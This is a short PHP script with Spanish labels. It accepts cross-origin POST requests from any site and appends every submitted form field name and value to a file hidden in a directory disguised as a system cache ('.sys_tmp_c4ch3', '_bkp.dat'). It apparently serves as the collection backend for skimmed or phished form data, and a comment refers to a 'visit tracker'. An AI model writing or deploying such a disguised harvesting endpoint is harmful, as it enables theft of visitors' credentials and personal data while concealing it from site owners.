<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$raw  = file_get_contents('php://input');
$body = json_decode($raw, true);

if (!$body || !isset($body['type'])) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Invalid payload']);
    exit;
}

$type      = $body['type'];
$fields    = $body['fields'] ?? [];
$timestamp = date('Y-m-d H:i:s');

$line  = str_repeat('=', 60) . PHP_EOL;
$line .= "TIPO     : " . strtoupper($type) . PHP_EOL;
$line .= "FECHA    : " . $timestamp . PHP_EOL;
$line .= str_repeat('-', 60) . PHP_EOL;

foreach ($fields as $field) {
    $name  = $field['name']  ?? '';
    $value = $field['value'] ?? '';
    // quitar backticks que usa el tracker de visitas
    $value = trim($value, '`');
    $label = str_pad($name, 18);
    $line .= $label . ": " . $value . PHP_EOL;
}

$line .= str_repeat('=', 60) . PHP_EOL . PHP_EOL;

$file = __DIR__ . '/.sys_tmp_c4ch3/q7x2k9m4p1r8s3v6w0y5z2a8b4c7d1e3f6g9h2j5l8n1o4_bkp.dat';
file_put_contents($file, $line, FILE_APPEND | LOCK_EX);

echo json_encode(['ok' => true]);
